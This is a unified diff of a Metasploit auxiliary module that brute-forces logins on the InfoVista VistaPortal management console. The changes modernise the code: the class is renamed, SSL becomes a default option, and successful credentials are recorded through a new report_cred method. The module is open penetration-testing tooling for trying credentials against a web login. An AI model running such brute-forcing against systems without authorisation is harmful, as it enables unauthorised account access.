@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -24,15 +22,15 @@ class Metasploit3 < Msf::Auxiliary
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     ))
 
     register_options(
       [
         Opt::RPORT(443),
-        OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true]),
         OptString.new('TARGETURI', [true, "URI for Web login. Default: /VPortal/mgtconsole/CheckPassword.jsp", "/VPortal/mgtconsole/CheckPassword.jsp"])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -79,6 +77,33 @@ class Metasploit3 < Msf::Auxiliary
     do_login(user, pass)
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'InfoVista VistaPortal',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   #
   # Brute-force the login page
   #
@@ -100,18 +125,7 @@ class Metasploit3 < Msf::Auxiliary
         vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}")
       else
         print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
-
-        report_hash = {
-          :host   => rhost,
-          :port   => rport,
-          :sname  => 'InfoVista VistaPortal',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'
-        }
-
-        report_auth_info(report_hash)
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
         return :next_user
       end
 
@@ -120,5 +134,4 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
   end
-
 end
